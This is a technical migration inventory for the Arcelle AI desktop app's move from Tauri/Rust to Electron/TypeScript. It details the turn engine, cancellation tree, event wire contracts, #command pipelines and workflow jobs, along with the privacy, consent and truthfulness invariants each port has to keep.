**Subsystem risks:** (1) Privacy-door seam coverage: today ONE Rust function (inject_policy) guards both sidecar gateways, and the doc comment warns that any new gateway silently re-opens the 2026-07-25 leak. The Electron rewrite multiplies outbound seams (main-process fetch, MCP client, TTS, web search) across two processes (main TS + Python sidecar); the policy cache must live in main with a single choke-point HTTP client, or a missed seam ships raw room content to the cloud with the panel still saying On. (2) Case-folding parity across engines: the redactor currently reconciles aho-corasick's ASCII-only folding with Python's re.I by adding explicit non-ASCII case variants. A JS port adds a third regime (regex 'iu'); port the explicit variant table and the pinned never-leak tests (+9725551234 inside a longer number, unspaced BenReich) rather than trusting any engine's folding. (3) Sketch geometry twins: Rust sketchdoc and src/viewers/sketch/model.ts are deliberate byte-level twins (CONNECT_GAP=8, route/routeBetween, no clamping). The rewrite's single biggest simplification is merging them into ONE shared TS library — but porting both separately would re-create the drift where every agent/editor alternation rewrites the same connector into the file. (4) Cancel/commit discipline: guard_commit's read-the-flag-immediately-before-the-side-effect pattern (Artifact funnel, studios, podcast audio, ai_action) is what fixed 'Studio creates files after the UI said stopped' (live QA 2026-08-03). In Node the async gaps around a save are wider; keep the DB commit synchronous (better-sqlite3) and re-read the flag inside the same tick as the transaction. (5) IPC payload-shape drift: Tauri auto-camelCases command args and serde renames every response to camelCase; Electron ipcMain does neither. All 77 handlers must be rewired through src/api.ts with byte-identical shapes, and events (privacy-scan, room-files-changed, sketch-drawn with the whole doc, studio-step with the emitted 'local' flag, ask-step, skills-changed, pull-progress, agent-open-file) must keep their exact payloads — several bug fixes live IN those payloads (the doc riding sketch-drawn, the local flag not being grepped from English). (6) PNG rasterization parity: to_png (resvg + bundled fontdb, emptied href resolvers, RASTER_MAX_W scaling) feeds both user exports and what vision models see of a drawing. @resvg/resvg-js is a prebuilt drop-in but fonts must be explicitly bundled and the no-external-fetch property re-asserted. (7) Decrypted-plaintext temp files: video trim (0600 create_new, removed on every path), skill-run workspaces (0700, claimed-before-created, orphan sweep for SIGKILL), browser previews (grace-based sweep because /usr/bin/open returns before the browser reads) each encode a specific crash-safety rule; Node fs must set modes at open, and every sweep must survive the port or decrypted room content outlives its session. (8) Leash stable identity: pasted external-agent configs depend on leash_port=17872 + leash_token surviving restarts, on store_bridge_if_current's teardown race guard (a stale bridge serving the NEXT room with THIS room's token), and on regenerate being the only revocation path. The @modelcontextprotocol/sdk bridge rewrite must preserve all three, plus files-tier tokens never touching leash.json. (9) Sidecar contract stability: this subsystem leans on ~10 existing sidecar endpoints with precise degrade contracts (error-code sentinels OLLAMA_DOWN/MODEL_MISSING vs verbatim toasts vs Ok(None)-never-Err for generate_ui_text, until_hangup cancellation-by-disconnect). The rewrite keeps the sidecar, so these survive — but the new main-process HTTP client must reproduce request-drop-as-cancel and the sentinel mapping exactly. (10) macOS tool dependence: avconvert (video trim) and afconvert (podcast AAC) ship with macOS and have deliberate no-ffmpeg fallbacks (re-encode preset; honest WAV fallback with truthful mime). Keep the fallback semantics — 'a big file that plays beats no episode' — rather than adding an ffmpeg dependency.



# Part II — full per-file detail

## 1. Agent, turns & chat

The agent-turns-chat subsystem is the app's turn engine: `ask` (the one chat entrypoint) orchestrates a turn end-to-end — cancel-tree registration, TurnId event enveloping, phased room-lock discipline (no await under the lock), deterministic pure-save short-circuit, streaming through the Python sidecar as the SOLE engine (no native LLM fallback), a deferred post-answer image-grounding pass, an anti-fabrication gate checked against runtime ToolEffects, and room-pinned persistence so stragglers never write into a different room/epoch. Around it sit: `exec_tool`, a ~58-arm dispatcher implementing every built-in agent tool with centralized required-arg validation against the advertised schemas; the tools_catalog/spec builders and BUILTIN_TOOL_NAMES reservation set (MCP shadow protection); `cancel.rs`, a Weak-linked cancellation TREE where cancelling a parent stops all children and `guard_commit` blocks side-effects at commit time; `turn.rs`, the {runId, chatId, v} event envelope every ask-* event travels in; `agent_ui.rs`, the oneshot request/response bridge to the live webview with a 20s machine / 600s human-consent timeout split; `token_usage.rs`, the post-handoff estimated budget-bar snapshot; `chat.rs`, plain chat/message CRUD + pasted image/audio import; and `chat_commands*`, the 14 deterministic `#command` pipelines (full-ops windowing that NEVER truncates, map/reduce folding, stream watchdogs, think-span stripping). Nearly all of it is pure orchestration + string/JSON logic over the sidecar HTTP API and the DB — it ports to Electron-main TypeScript naturally, with the sidecar endpoints unchanged. The hard parts are wire-contract fidelity (event envelope, effects JSON, notice strings that other code matches literally) and Rust-specific mechanics (byte-offset string logic, Drop-based tree pruning) that have no direct JS equivalent.

### `src-tauri/src/commands/agent.rs` — 7155 LOC → electron-main (15 d)

The turn engine. #[tauri::command] `ask` runs a full chat turn (context gathering under the room lock, sidecar-driven answer, deferred image grounding, anti-fabrication correction, room-pinned persistence); `exec_tool` is the ~58-arm dispatcher implementing every built-in agent tool plus the MCP-route fallback; plus the tool-spec/catalog builders, `list_specialists`, `cancel_ask`, `handoff_chat`, and a large kit of text utilities (quote matching, clamps, excerpts, claim detection). ~1750 of the 7155 lines are unit tests (108 test fns).

**Replacement:** TypeScript module in Electron main: `ask` becomes an ipcMain handler that reads the DB via better-sqlite3-multiple-ciphers, calls the existing sidecar /run over HTTP (undici), and emits ask-* events via webContents.send; exec_tool becomes a typed dispatcher map validated with ajv against the same JSON schemas, exposed to the sidecar through the room MCP bridge (@modelcontextprotocol/sdk). Image downscale (downscale_png_b64) moves to sharp; grounding/vision calls stay sidecar HTTP endpoints.

**Must preserve:**
- ask phases: Phase 1 gathers context and saves the user message UNDER the room lock with zero awaits; Phase 2 (answer) runs unlocked; Phase 3 persists via RoomPin — the reply row is written ONLY if the same room path AND epoch are still open, otherwise the message is returned in memory unsaved (content must never cross a room boundary onto disk)
- The sidecar is the SOLE AI engine: SidecarOutcome::Unavailable surfaces the reason as an error (no native fallback); Failed KEEPS the partial text + merged effects as a normal answer with an in-transcript note (a committed tool side-effect must stay visible, never re-run); Done("") means the answer was LOST, not empty — replaced by empty_reply_notice which truthfully reports whether a write happened (effects.wrote) and whether a background job is still live (reads the jobs table, never guesses)
- Deterministic pure-save path: 'save that as a file' with no attachments never reaches the model — content is the previous non-failure assistant reply (is_failure_notice filters the app's own notices), name parsed by requested_file_name; it strips the literal " *(stopped)*" suffix
- Anti-fabrication gate (CHG-10): claims_unbacked_action scans prose (fenced blocks dropped, per-line negation guard) for write/highlight claims and appends a correction when effects say no write/annotation actually happened; never applied over a stopped partial
- Stop semantics: cancel flag is the ROOT of the run's cancel tree; a stopped turn appends '*(Also stopped: …)*' from cancel_node.stopped_children() (only still-live nodes — finished work is never claimed stopped) then the exact " *(stopped)*" suffix last
- Image grounding is DEFERRED to after the answer (fast first token), runs only if the model didn't already mark_image, is skipped on Stop, and picks the vision model by capability (grounding_pick) — never by name, never faked with a text-only model
- exec_tool validates missing required args centrally against each tool's advertised schema (missing_required_arg) because every arm reads args with unwrap_or_default — an empty string used to silently target the newest file in the room; empty string counts as missing except the (move_file, folder) pair
- BUILTIN_TOOL_NAMES (~70 names) is the reserved set MCP tools may never shadow — including names not in any catalog (local_generate, consult_advisor) because a shadowed arm would skip the SEC-1b consent gate; colliding MCP routes rename to <name>_2
- SKILL_AGENT_IDS is both the save_skill enum and its validation set, pinned to the sidecar registry by sidecar/tests/test_skill_agent_parity.py — a typo'd agent id made a skill invisible forever
- Tool-gating heuristics (wants_write_tools, wants_ui_tools, wants_job_tools, is_pure_save_reference, explicit_skill_request for /skill syntax) decide which tool specs enter the prompt — token-budget-driven, tuned for a 4B model
- handoff_chat: compacts history to the engine's real context window BEFORE the one-shot summary call (cloud engines trim nothing), rejects an empty/think-only recap as a failed handoff (an empty recap silently wiped the chat's memory), appends an honest 'covers N of M messages' note, and emits the estimated token_usage snapshot
- Style paragraphs (STYLE_TERSE/FRIENDLY/FORMAL) and the skills preamble are BYTE-STABLE so Ollama KV-cache reuse survives across turns; skills metadata rides the per-turn user message, not the system prompt
- normalize_for_match folds curly quotes, dashes, Hebrew maqaf and strips nikud so model quotes meet extracted text; closest_snippet returns a VERBATIM substring of the extracted text by word-overlap majority (never highlights something unrelated)
- list_specialists errors rather than returning [] when the sidecar is unreachable ('no specialists' vs 'could not find out' are different answers); the roster is derived from the sidecar registry + the host's web/bridge-scope facts, never hand-listed
- cancel_ask returns a StopReport naming what was actually stopped (tree walk), and logs known=false when the Stop reached nothing

**Gotchas:**
- closest_snippet, floor_boundary, clamp_bytes, tail_bytes, excerpt all operate on Rust UTF-8 BYTE offsets; a naive JS port using UTF-16 .length/.slice corrupts Hebrew/emoji text — reimplement with TextEncoder or char arrays and port the tests (clamp_chars vs clamp_bytes distinction is itself a fixed bug: byte-clamping a Hebrew memory halved it silently)
- Dozens of literal string couplings: the " *(stopped)*" suffix is stripped by the save-path by that exact literal; empty_reply_notice constants, 'Stopped — {what} was not saved.', the correction sentence — other code and tests match these exactly
- The effects column JSON shape ({boxes, annotation, edits, usage, agents}) and the ask-* envelope are wire contracts with the React frontend AND persisted in old rooms — old fenced ```boxes blocks are still parsed as legacy fallback, so shapes cannot drift
- Ordering subtleties defended in comments: '(Also stopped …)' is written BEFORE the stopped marker so the suffix stays last; the cancel flag is set BEFORE the tree walk; steps chips name each slow phase as it begins (Ollama wake, embed load, search) — reordering reintroduces diagnosed live-QA bugs
- chat_messages is MOVED into the sidecar call, not cloned — it can carry megabytes of base64; the TS port should avoid duplicating it per ask
- Many exec_tool arms delegate into other modules (files, browse, studios, jobs, memory, skills, MCP, downloads) covered by other inventories — the dispatcher can only be finished after those land; build it interface-first against stubs
- The ~1750-line test module encodes owner decisions (privacy, truthfulness); skipping the port of these tests is how 'inert fixes' shipped before

**Native/Tauri surface:** tauri::Window / tauri::Emitter (window.emit for ask-* events); tauri::AppHandle, tauri::Manager, tauri::State; tokio (time::timeout, sync primitives); image crate (load_from_memory, resize CatmullRom, PNG encode in downscale_png_b64)

### `src-tauri/src/commands/chat_commands/generate.rs` — 989 LOC → electron-main (3 d)

The generative #command pipelines: #summarize, #compare, #transcribe (spawn_blocking transcript formatting), #minutes, #sketch (structured drawing-script generation + merge), #to-sheet, #translate (chunked with ChunkFailures give-up logic), #research (web search → save each source into the room as an offline copy → answer from those files).

**Replacement:** TS functions on CmdCtx; #translate/#summarize/#minutes reuse map_windows/digest; #sketch calls the sidecar's structured-output endpoint with sketch_schema and merges scripts in TS; #research composes the existing web-search and save-page services; the transcript formatting that used spawn_blocking moves to a worker thread or the sidecar.

**Must preserve:**
- ChunkFailures: one bad slice is skipped (best-effort, same contract as map_windows), but CHUNK_GIVE_UP_AFTER=3 consecutive failures means the ENGINE is broken — stop retrying (each retry costs a full 300s timeout) and report the FIRST error verbatim (actionable, e.g. 'Ollama isn't running'), never a generic 'returned nothing'
- #translate chunks by 3000 CHARS (chars, not bytes — already Unicode-safe), accepts 'to <lang>' or a bare language, streams per-part step chips, refuses files with no readable text
- #research: requires the room's web switch (off → an actionable saved MESSAGE, not an error toast); a blocked/rate-limited search fan-out is reported as 'did not run', explicitly NOT as 'no results' (saying the web was empty would be a fabrication); each source is saved into the room so the answer survives offline
- #sketch uses ask_structured with a JSON schema so the drawing script is machine-readable, merges multi-window results (merge_sketch), and derives a safe file stem for the saved drawing
- #transcribe formats an existing recording transcript without a model call for the transcript body (spawn_blocking for the heavy formatting)

**Gotchas:**
- The blocked-vs-empty web-search distinction (page.blocked_note()) is an anti-fabrication rule the owner has re-litigated — keep both branches and their wording
- spawn_blocking exists because transcript formatting blocked the async runtime; in Node the equivalent hazard is blocking the main-process event loop — use a worker_thread or push it into the sidecar
- #research and #sketch depend on the web-fetch and drawing subsystems respectively — sequencing with those inventories' ports

**Native/Tauri surface:** tauri::Emitter, tauri::Manager; tauri::async_runtime::spawn_blocking (transcript formatting)

### `src-tauri/src/commands/chat_commands.rs` — 785 LOC → electron-main (2 d)

The #command framework: the 14-entry CHAT_COMMANDS catalog (list_chat_commands), run_command dispatch (mirrors ask's cancel/save boilerplate but runs fixed pipelines), CmdCtx with ask_streaming/ask_quiet/ask_structured model-call helpers, the watch_stream Stop/stall watchdog, and the full-ops windowing primitives (cmd_windows, map_windows, fold_notes, digest).

**Replacement:** TS module in Electron main: run_command as an ipcMain handler, CmdCtx as a class calling the sidecar's /generate, /generate_stream and structured endpoints over HTTP (undici streaming); watch_stream becomes Promise.race over the stream, an AbortSignal poll and idle/stop timers.

**Must preserve:**
- Full-ops contract: a #command reads its WHOLE source — bigger-than-one-call sources are windowed (CMD_WINDOW_CHARS=16000, overlap 400, extraction::partition_windows) with one pass per window then merge; truncation is the diagnosed bug that reduced #minutes to the first 5 minutes
- Windows the model failed on are COUNTED (unread) and reported in the reply ('N part(s) of the source couldn't be read') — never silently covered less
- watch_stream: Stop abandons the stream but KEEPS the partial the user watched arrive (1.5s grace for the stream to notice, then hang up returning the mirrored partial); silence past the idle budget is a hang with an actionable error
- Idle budget is per-transport, read from the DECLARED capability record (streaming == No → 960s, just past the sidecar's 900s wedged-CLI budget), not from engine-name matching — non-streaming engines emit ONE delta at the very end so the silence clock spans the whole answer
- Quiet steps (output becomes a file/table, never read by a human first) strip <think>…</think> spans — an unterminated think span yields empty string, which is safer than leaking reasoning into a user document; quiet steps also get a 300s hard timeout
- #checkpoint short-circuits BEFORE the Ollama probe (must work with the local AI stopped) and never calls a model
- Commands honor the room's chosen engine exactly like chat (cloud CLIs and :cloud included, wearing their 'leaves this Mac' labels); only a room with no model setting falls back to best_local_default
- run_command reads the WHOLE conversation since the last handoff (recent_messages with -1), sets the chat title from the raw line (48 chars + ellipsis), appends ' *(stopped)*' on Stop, and floors empty content to 'Done.'
- fold_notes is loss-of-detail-never-coverage: re-folds until one call holds it, stops when a round fails to shrink; FOLD_MAX_ROUNDS=6 guards an echoing model

**Gotchas:**
- run_command uses the FLAT cancel registry (plain flag), not register_run/the tree — mirror that faithfully or Stop reporting semantics change
- The watchdog samples every 200ms and mirrors the partial into a Mutex<String> alongside emitting deltas — the TS port needs the same mirror or Stop returns an empty message instead of the on-screen partial (a fixed bug)
- CMD_WINDOW sizes are tuned to the sidecar's payload-fitted num_ctx for 4B local models — changing them silently changes cost/quality
- Window boundaries come from extraction::partition_windows (byte spans over UTF-8) — same UTF-16 hazard as agent.rs when porting

**Native/Tauri surface:** tauri::Window, tauri::State, tauri::Emitter; tokio (select!, pin!, sleep, timeout)

### `src-tauri/src/commands/chat_commands/knowledge.rs` — 642 LOC → electron-main (2 d)

The knowledge-side #command pipelines: #remember (verbatim memory save with duplicate check), #find (exhaustive match list), #add-file (single or 'for each' fan-out file creation), #highlight (verified passage annotation), #extract (fields from several files into a spreadsheet, with a direct tabular read for CSV/TSV).

**Replacement:** TS functions on the CmdCtx class, calling the DB layer directly for memory/files and the sidecar for generation; the #highlight path reuses the ported build_annotation/normalize_for_match utilities from agent.rs.

**Must preserve:**
- #remember saves the fact VERBATIM (no silent 500-char cut) and reports an existing duplicate instead of double-saving; stays uncategorized
- #find returns EVERY match (it is a result list, not context) but prints at most MAX_FIND_MATCHES=50 and COUNTS the rest — a silent cut would read as 'that was all of them'
- #add-file 'for each' fan-out is capped at MAX_FAN_OUT_FILES=25 (no preview, no undo) and the answer names how many items were left out
- #extract compensates for small local models with tabular_field_rows: a direct CSV/TSV column read that bypasses the model when the source is already tabular
- #highlight goes through the same ground-truth quote verification as the annotate_file tool (normalize_for_match + closest_snippet) — never highlights text not actually in the file

**Gotchas:**
- The cap-and-count pattern (print N, count the rest) is an owner truthfulness rule repeated across commands — new code paths must not silently cut
- duplicate_memory and the memory char-cap live in other modules; sequencing dependency on the memory subsystem port

**Native/Tauri surface:** tauri::Emitter (step/delta events via CmdCtx)

### `src-tauri/src/cancel.rs` — 525 LOC → electron-main (2 d)

The cancellation TREE (owner decision 2026-08-03: cancelling a parent kills every child AND blocks artifact writes). Nodes hold an AtomicBool flag, a human label, and Weak child links; guard_commit gates every write side-effect at the moment it commits; StopReport tells the user truthfully what a Stop actually stopped; the flat cancels/job_cancels registries remain for legacy pollers.

**Replacement:** A TS CancelNode class: {cancelled: boolean, label, children: Set<WeakRef<CancelNode>>} plus a registry Map<runId, WeakRef>; workers poll node.cancelled or receive an AbortSignal derived from it (AbortController per node, parent.signal cascades via 'abort' listeners). Port all 13 tests to vitest.

**Must preserve:**
- Cancel walks DOWN eagerly (sets every descendant flag) rather than checking a parent chain on read — the ~40 existing pollers must see truth without knowing the tree exists
- Race closure: cancel sets its OWN flag BEFORE walking, and adopt_child re-checks the parent's flag after linking — so a child registered mid-walk is born cancelled (otherwise it writes an artifact into a stopped room)
- guard_commit is called IMMEDIATELY before every side-effect commit, not when the work was decided — the stretch after the last model-call check is exactly where a Stop lands; error text 'Stopped — {what} was not saved.' names the artifact in user words
- StopReport truthfulness: already-cancelled nodes are not re-reported; unknown id → known=false ('stopped nothing' is a distinct, visible outcome); also_stopped() is None in the ordinary single-node case
- stopped_children() lists only still-LIVE cancelled descendants — finished work dropped its node and naming it would claim the Stop reached something it did not
- child_of_run falls back to a ROOT (not a silent attach to whatever run is open) when the parent run is gone — orphan work must not inherit an unrelated Stop
- cancel_all covers the room-lock/close drain's blind spot: the flat maps hold ROOTS only, children live only in the tree, and without this a Studio build kept writing into a room being sealed
- Recursion collects children under the lock but recurses OUTSIDE it (documented deadlock avoidance); dead Weak links are pruned on every walk — no epilogue unregisters anything

**Gotchas:**
- The whole pruning design leans on Rust Drop: a finished child's Arc drops and its Weak dies deterministically. JS WeakRef + GC gives NO deterministic timing — stopped_children() could report long-finished work as stopped. Safest port: explicit release (try/finally dispose() when the owning async fn returns) instead of relying on WeakRef emptiness; keep WeakRef only as a leak backstop
- Node is single-threaded so the Mutex/poison handling vanishes, but the SeqCst swap-returns-previous idiom (report only the first transition) must be kept explicitly
- The label strings are privacy-relevant by design: labels name work ('Flashcards'), NEVER room content — preserve that rule in every new call site

### `src-tauri/src/turn.rs` — 163 LOC → electron-main (0.5 d)

TurnId: the run/chat identity envelope every ask-* event travels in ({runId, chatId, v}), so a broadcast event can be attributed to the turn that produced it and late/foreign events rejected by the frontend; emit_unowned/step_for send null-id events for work that genuinely has no turn.

**Replacement:** A ~60-line TS class in Electron main wrapping webContents.send('ask-delta'|'ask-step'|…, {runId, chatId, v}); envelope() stays a pure function so the wire shape is unit-testable without Electron.

**Must preserve:**
- runId is the FRONTEND-minted ask id (same id is the /cancel handle and the sidecar's run_id), so the chat registers the run before the first event can arrive and rejects mismatches — the fix for answers streaming into whichever chat was on screen
- Payload v is byte-identical to what listeners received pre-envelope (bare string for ask-delta, object for ask-step, null for ask-round)
- Unowned events (AI-actions menu, persistent-bridge tools) carry NULL ids rather than borrowing the on-screen chat — guessing an owner is exactly the bug this module deleted
- Emit failures are ignored: a closed window must never fail a running turn

**Gotchas:**
- The frontend treats a null-id event as 'show only if this chat is running something' — the TS port must serialize runId/chatId as JSON null, not omit the keys
- Event names (ask-delta, ask-step, ask-round, ask-token-usage, ask-privacy, agent-ui-request) are the IPC contract with src/api.ts listeners — inventory them before rewiring to ipcRenderer

**Native/Tauri surface:** tauri::Emitter / tauri::Runtime (generic emit)

### `src-tauri/src/commands/agent_ui.rs` — 154 LOC → electron-main (0.5 d)

The agent↔UI bridge: tools that need the live webview (element snapshot, click/type, video frame grab, viewer composite, browse consent) emit an agent-ui-request event with a request id, park on a oneshot channel, and the frontend answers via the resolve_agent_ui command.

**Replacement:** A TS Map<string, {resolve, timer}> of pending Promises in Electron main; request_ui becomes webContents.send('agent-ui-request', …) plus a Promise.race with a setTimeout; resolve_agent_ui becomes an ipcMain.handle that rejects unknown/expired ids with the exact NO_LONGER_WAITING sentence.

**Must preserve:**
- Two timeout tiers: 20s for machine-answered requests, 600s for browse_consent (needs_a_person) — the 20s budget used to fail a consent card while the user was still reading what would be typed into a web page
- A human timeout is reported as 'nobody approved it, do not retry' (a refusal the model must respect), NOT as an interface malfunction
- Answering an id that is no longer pending is an ERROR with the fixed NO_LONGER_WAITING sentence — an Ok used to make the consent card vanish while nothing ran, so the user believed typing was approved
- The pending entry is cleaned up on timeout; the driver's payload may carry an {error} field which becomes an Err even on a delivered answer

**Gotchas:**
- The NO_LONGER_WAITING and did-not-answer sentences are shown to users verbatim and asserted in tests — keep them character-identical
- In JS the oneshot's second failure mode (receiver dropped while entry still present) collapses into the same Map-miss path; make sure the double-resolve case still errors rather than silently succeeding

**Native/Tauri surface:** tauri::Window emit, tauri::State; tokio::sync::oneshot, tokio::time::timeout

### `src-tauri/src/commands/chat.rs` — 131 LOC → electron-main (0.5 d)

Chat/message CRUD (list/create/delete/rename chat, get/delete message) plus pasted-media import: import_image_bytes and import_audio_bytes decode base64, size-check, insert as room files, and (audio) enqueue background STT.

**Replacement:** Thin ipcMain handlers over the DB layer (better-sqlite3-multiple-ciphers); Buffer.from(b64, 'base64') for decode; mime lookup via the mime npm package; STT enqueue posts to the Python sidecar's job queue (pywhispercpp).

**Must preserve:**
- check_paste_size measures the BASE64 length (4 chars per 3 bytes) against MAX_DOWNLOAD_BYTES BEFORE decoding — an oversized paste is refused without materializing a second copy; error names the file and the MB limit
- Audio mime is forced to a playable value: .m4a/.mp4 → audio/mp4 (guessers say audio/m4a, which the <audio> element refuses), .webm → audio/webm
- import_audio_bytes stores BOTH the audio file and enqueues transcription with the room path AND epoch stamped on the JobMeta — a rollback drops the queued job rather than writing the transcript into the swapped room
- delete_message exists to power regenerate: drop the last assistant reply, re-run ask with the prior question

**Gotchas:**
- The audio/m4a→audio/mp4 mapping was diagnosed against WKWebView; verify Chromium's <audio> behavior but KEEP the mapping (audio/mp4 is correct everywhere and stored mimes persist in .room files across the migration)
- The epoch stamp on the STT job is part of the rollback-safety contract — the Electron port needs an equivalent room-epoch counter before this file can be finished

**Native/Tauri surface:** tauri::AppHandle, tauri::State (base64 + mime_guess crates otherwise)

### `src-tauri/src/token_usage.rs` — 89 LOC → electron-main (0.25 d)

The ONE host-side token-budget computation left: the estimated placeholder snapshot shown right after a context handoff (recap charged to 'history', everything else honestly zero, all flagged estimated). Real per-turn usage is computed sidecar-side in usage.py.

**Replacement:** A ~30-line pure TS function returning the same snake_case JSON; alternatively fold it into the sidecar's usage.py since the shape is already defined there — but it must stay callable without a model turn.

**Must preserve:**
- CHARS_PER_TOKEN = 3, deliberately identical to usage.py's floor (undercounting chars-per-token overstates tokens — the safe direction)
- The 5 categories (system, history, tools, skills, files) are fixed and ordered; a missing key silently drops a frontend legend segment, so every category is always present
- Output is snake_case (total_tokens, max_context, estimated, breakdown) matching the sidecar-emitted AskTokenUsage shape exactly

**Gotchas:**
- history is computed from recap BYTE length in Rust (recap.len()); in TS use Buffer.byteLength, not .length, or Hebrew recaps will show ~half the tokens

**Subsystem risks:**
- Wire-contract drift is the top risk: the {runId, chatId, v} envelope, the ask-* event names, the effects column JSON ({boxes, annotation, edits, usage, agents}), the snake_case AskTokenUsage shape, and a dozen literal user-facing sentences (" *(stopped)*", 'Stopped — {what} was not saved.', NO_LONGER_WAITING) are matched byte-for-byte by the React frontend, by tests, and by other host code (the pure-save path strips the stopped suffix by literal). Effects JSON is also PERSISTED in existing .room files, so the shapes are frozen by the migration story, not just by the frontend.
- Rust byte-offset string logic (closest_snippet, clamp_bytes vs clamp_chars, floor_boundary, tail_bytes, excerpt, partition_windows spans) will silently corrupt Hebrew/CJK/emoji text if ported with UTF-16 indices — this codebase is heavily Hebrew-exercised and has already shipped-and-fixed exactly this bug class once (byte-clamped memories). Every such helper needs a TextEncoder/char-array reimplementation plus its ported tests.
- The cancel tree's correctness leans on Rust Drop for deterministic pruning (finished work's Weak dies immediately). JS GC gives no such timing: WeakRef-based pruning would let stopped_children() and StopReport report long-finished work as 'stopped' — a truthfulness regression the owner explicitly legislated against. The port needs explicit dispose() lifecycles (try/finally in every work-owning async fn), which touches every call site, not just cancel.ts.
- exec_tool's ~58 arms call into nearly every other subsystem (files, browse, studios, jobs, memory, skills, MCP, downloads, drawing); this group cannot be completed independently — build the dispatcher, schemas, and BUILTIN_TOOL_NAMES reservation first against typed stubs, and gate completion on the other subsystems landing. The MCP-shadowing reservation must be enforced in the new @modelcontextprotocol/sdk bridge or third-party servers regain the consent-bypass hole (SEC-1b).
- Concurrency-model translation: the Rust code's discipline is 'no await while holding the room mutex' + async tasks polling AtomicBools. In Electron main the mutex mostly disappears (single-threaded), but better-sqlite3 is SYNCHRONOUS — a long query inside ask's Phase 1/3 blocks the entire main process (IPC, menus, updater). Plan for the DB in a worker thread with an async facade, which reintroduces the very interleaving the room-lock discipline guarded against (RoomPin epoch checks become load-bearing again — port them exactly).
- The turn engine encodes ~30 diagnosed live-QA bugs as ordering rules and honesty rules (Done("") = lost-not-empty, Failed keeps the partial and never re-runs a committed tool, deferred grounding, empty_reply_notice reading the jobs table, blocked-web-search ≠ empty web). None of these are visible in a happy-path port; the 108+ unit tests in this group are the only executable spec — port them to vitest FIRST and require them red-then-green, per the standing 'inert fixes' lesson.
- Timeout budgets are cross-layer coupled: chat_commands' 960s non-streaming idle ceiling is sized against the sidecar's EXTERNAL_IDLE_SECS=900, agent_ui's 600s consent budget against human reading time, and stream_idle_secs reads the declared capability record. If the sidecar's budgets change during its expansion, these host-side numbers must move in step or long #research runs on CLI engines die mid-answer again.

## 2. Jobs & workflows

The jobs-workflows subsystem is Arcelle's durability backbone: a checkpointed, resumable background-job engine (jobs.rs core: Lane-sloted step-DAG scheduler `plan_dispatch`/`run_plan`, dense-prefix cursors, panic-guaranteed runner epilogues), a single-slot FIFO queue (queue.rs) whose one dispatcher `start_job_from_row` rebuilds any of 8 job kinds from its persisted plan, a generation-pinned 30s workflow scheduler with DST-aware next-run math and at-most-one catch-up (scheduler.rs), a debounced auto-index waiter (auto_index.rs), and per-kind runners: deep_summary/studio/podcast (jobs.rs), whole-file map/compose/publish pass (file_pass.rs), recording reader with hallucination-proof turn-number timestamps (rec_read.rs), the 16-node-kind LLM workflow engine with compile/validate/consent-gated script nodes/agent tools/templates (workflow.rs, 5.8k lines), sandboxed script execution with uv/python3/node interpreter policy and auto-heal (script_run.rs), billed image/video generation with shot-list chaining (create.rs), and URL/yt-dlp downloads (download.rs). db/jobs.rs persists jobs+artifacts with heavily-commented invariants: five statuses only, parked_reason semantics, work_identity dedupe, history pruning. Model calls ALREADY route through the Python sidecar (/generate, /file_pass_map, /file_pass_section, /rec_read_map, /image_generate, /video_start|status, LangGraph chain nodes), so the rewrite is mostly orchestration-to-TypeScript in Electron main; the deep risk is the invariant density — most behaviors live in comments and ~150 unit tests, not in types. 27 tauri commands, ~18,077 LOC total, est. ~46.5 dev-days.

### `src-tauri/src/commands/jobs/workflow.rs` — 5855 LOC → electron-main (12 d)

The LLM workflow engine: WorkflowDef (16 node kinds: generate, summarize_file, file_pass, agent_run, save_file, condition, script_run, transform, merge, http_fetch, extract, route, vote, for_each_file, refine, plan_and_map), validation (draft vs runnable rigor), topo-sort compile to the Step plan, the node executor with live-edge/skip propagation, spawn_workflow_job runner, start_workflow_run orchestration with double-checked refusals, script-consent stamping, the workflow CRUD commands, LLM compose_workflow, agent tools (list/save/update/delete/run/test), and builtin templates.

**Replacement:** TS: zod discriminated union for NodeKind (unknown-keys-passthrough for old defs), pure validate/topo/compile with ported tests, node executor as a switch dispatching to sidecar fetch calls and the TS file/script/agent facilities, runner on the shared run_plan core. Agent tool wrappers and compose_workflow (LLM writes a def, validated before save) port as sidecar-backed functions. Largest single file in the subsystem — split the port into types/validate+compile/executor/orchestration/tools.

**Must preserve:**
- All orchestration is deterministic host code on the checkpointed job runner — no dynamic LangGraph composition; fuzzy node bodies (generate/route/vote/refine/plan_and_map/extract, and CHAIN sub-graphs) run in the sidecar (/generate + LangGraph endpoints), with vote/route aggregation rules mirror-tested against sidecar tests
- Conditional edges v1: run_plan is untouched — a step whose incoming edges are all DEAD (skipped/missing parent or branch mismatch) writes a {skipped:true} artifact and returns Ok, so skip propagates transitively, done stays a valid set, resume keeps working
- The WorkflowPlan on the jobs row is an IMMUTABLE snapshot (def + resolved model + trigger + prev_run_at + script_consents + compiled steps) — a later edit of the workflow never corrupts a paused run
- Checkpoint persists the REAL done-set as job.state.done (sorted array), not a cursor — the [BLOCKER] fix; resume seeds from it
- script_consents: per-node script file id → approved SHA-256, stamped at ENQUEUE from the per-Mac approvals file ∪ this invocation's grants; the executor re-hashes and PARKS on mismatch (NEEDS_APPROVAL marker → status 'paused' + parked_reason, NOT 'error' — the assistant must not say a parked workflow 'errored'), so a mid-run edit or a scheduled run never silently executes changed code
- start_workflow_run re-checks in-flight-run and queue-cap refusals UNDER the lock that mints the row (the cheap early check spans an await; two Run-now presses one keystroke apart once both queued); retire_parked_jobs runs AFTER both inserts so a Resume card is only dropped once its replacement exists; non-manual triggers are refused SILENTLY (empty job id) and the schedule still advances
- prev_run_at = the last SUCCESSFUL run's start (since_last_run/new_files_since_last_run) — measuring from a failed attempt would skip files forever
- Only a MANUAL run's terminal event carries fileId (a scheduled run must never yank the viewer); a workflow job also closes/pauses its workflow_runs row on every landing
- Artifacts stamp node_label/node_kind at store time (compiled order ≠ def order, the frontend can't derive it); condition artifacts record the taken branch; save_file/file_pass artifacts record the written file id for idempotent re-execution
- Node model field: ''/auto = per-run resolve, 'local'/'cloud' classes, or an explicit name — honoring external CLIs and :cloud proxies (engine parity); interpolation supports {{input}}/{{files}}/{{date}} and happens HOST-side against the encrypted DB — the sidecar never sees a room query
- Every node error funnels through humanize_empty_generation once, and the NEEDS_APPROVAL prefix is stripped before display
- validate has two rigors (a draft may be incomplete; a run may not), plus binding validation (general vs file scope, run_input selectors require a file binding)
- backfill_node_labels/unknown-key tolerance keep OLD stored definitions parsing — the def JSON is durable data in .room files

**Gotchas:**
